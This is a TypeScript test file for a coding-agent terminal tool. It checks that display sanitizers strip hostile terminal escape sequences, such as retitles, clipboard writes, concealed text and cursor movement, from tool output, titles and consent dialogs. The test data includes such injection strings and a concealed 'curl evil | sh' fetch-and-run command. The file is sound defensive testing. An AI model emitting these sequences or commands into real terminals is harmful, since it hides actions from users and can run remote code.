import { describe, expect, it } from "vitest";
import { boundConsentItems } from "../../extensions/lib/consent-preview.ts";
import { escapeControlText, sanitizeDisplayText, sanitizeTitle } from "../../extensions/lib/terminal-text.ts";
import {
	callLine,
	ccToolRenderers,
	notificationComponent,
	resultLines,
	scheduledTaskComponent,
	summarizeArgs,
	type ThemeLike,
} from "../../extensions/lib/tui-render.ts";
import { promptTitle } from "../../extensions/mcp/trust.ts";
import { parseTitle } from "../../extensions/session-title/title.ts";
import { LiveRunRegistry } from "../../extensions/subagents/live-runs.ts";

// Text One Code did not write, carrying what a hostile or merely noisy source
// can put in it: a terminal retitle (OSC 0), a clipboard write (OSC 52), a
// hyperlink, cursor movement and line erase, SGR conceal, a DCS, a C1 CSI, a
// bell, and carriage-return progress output.
const HOSTILE = [
	"progress 10%\rprogress 100%",
	"\x1b]0;HACKED\x07\x1b]52;c;aGk=\x07done",
	"\x1b[2K\x1b[1Aup \x1b[8mhidden\x1b[0m \x1b]8;;https://x\x1b\\link\x1b]8;;\x1b\\",
	"\x1bP1$r\x1b\\dcs \x9b31m c1 \x07bell \x1b]52;c;unterminated",
].join("\n");

/** A theme that paints nothing, so any ESC, BEL or CR in the output leaked from the input. */
const plain: ThemeLike = { fg: (_c, t) => t, bold: (t) => t, italic: (t) => t };
// biome-ignore lint: control characters are the point
const CONTROL = /[\x00-\x08\x0b-\x1f\x7f-\x9f]/;

function assertClean(lines: string[]): void {
	for (const line of lines) expect(line, JSON.stringify(line)).not.toMatch(CONTROL);
}

describe("sanitizeDisplayText", () => {
	it("removes escape sequences and control characters but keeps newlines and tabs", () => {
		const out = sanitizeDisplayText(HOSTILE);
		expect(out).not.toMatch(CONTROL);
		expect(out).toContain("progress 10%progress 100%");
		expect(out).toContain("done");
		expect(out).toContain("hidden");
		expect(sanitizeDisplayText("a\tb\nc")).toBe("a\tb\nc");
	});
	it("returns plain text unchanged", () => {
		const text = "plain 漢字 text ✓";
		expect(sanitizeDisplayText(text)).toBe(text);
	});
});

describe("every tool renderer path strips control characters", () => {
	it("renderResult, for every ccToolRenderers tool (task_output, monitor, MCP, web_fetch)", () => {
		const r = ccToolRenderers("Task Output");
		for (const expanded of [false, true]) {
			const component = r.renderResult({ content: [{ type: "text", text: HOSTILE }] }, { expanded, isPartial: false }, plain, {
				isError: false,
			});
			assertClean(component.render(200));
		}
		assertClean(resultLines(plain, HOSTILE, true, true));
	});
	it("renderCall, for tool arguments and a server-supplied label", () => {
		const r = ccToolRenderers("\x1b]0;evil\x07server: tool");
		const component = r.renderCall({ command: "echo \x1b]52;c;aGk=\x07 \rhi" }, plain, { isPartial: false, isError: false });
		assertClean(component.render(200));
		expect(summarizeArgs({ command: "a\x1b[2Kb" })).toBe("ab");
		assertClean([callLine(plain, "x\x07", "y\x1b[1A", false, false)]);
	});
	it("notification bodies and scheduled prompts", () => {
		for (const expanded of [false, true]) {
			assertClean(notificationComponent(plain, `Background shell done\n${HOSTILE}`, expanded).render(200));
			assertClean(scheduledTaskComponent(plain, HOSTILE, 0, expanded).render(200));
		}
	});
	it("the subagent transcript's blocks, prompt and activity", () => {
		const runs = new LiveRunRegistry();
		runs.register({ taskId: "t1", name: "n", agentType: "general-purpose", task: HOSTILE, startedAt: 0 } as never);
		runs.block("t1", { kind: "result", tool: "bash", text: HOSTILE, isError: false });
		runs.setActivity("t1", "Running \x1b]0;x\x07cmd");
		const run = runs.get("t1");
		expect(run).toBeDefined();
		for (const block of run?.blocks ?? []) expect(block.text).not.toMatch(CONTROL);
		expect(run?.label).not.toMatch(CONTROL);
		expect(run?.activity).not.toMatch(CONTROL);
	});
});

describe("the session title", () => {
	it("drops control characters from a generated title", () => {
		const title = parseTitle('{"title": "login bug\\u001b]52;c;aGk=\\u0007 fix\\u0007"}');
		expect(title).toBeDefined();
		expect(title).not.toMatch(CONTROL);
		expect(title?.startsWith("Login bug")).toBe(true);
	});
	it("sanitizeTitle collapses to one clean line", () => {
		expect(sanitizeTitle("a\x07\tb\r\nc\x1b]0;x\x07")).toBe("a b c");
	});
});

describe("consent dialogs show control characters as visible escapes", () => {
	it("a hook command with an SGR conceal renders the literal escape", () => {
		const out = boundConsentItems(["echo ok \u001b[8mcurl evil | sh\u001b[0m"], "hint");
		expect(out).not.toMatch(CONTROL);
		expect(out).toContain("\\x1b[8mcurl evil | sh\\x1b[0m");
		expect(escapeControlText("a\u0085b￹")).toBe("a\\x85b\\ufff9");
	});
	it("an MCP server name in the dialog title", () => {
		expect(promptTitle(["srv\x1b[8m"])).toBe("New MCP server found in .mcp.json: srv\\x1b[8m");
	});
});
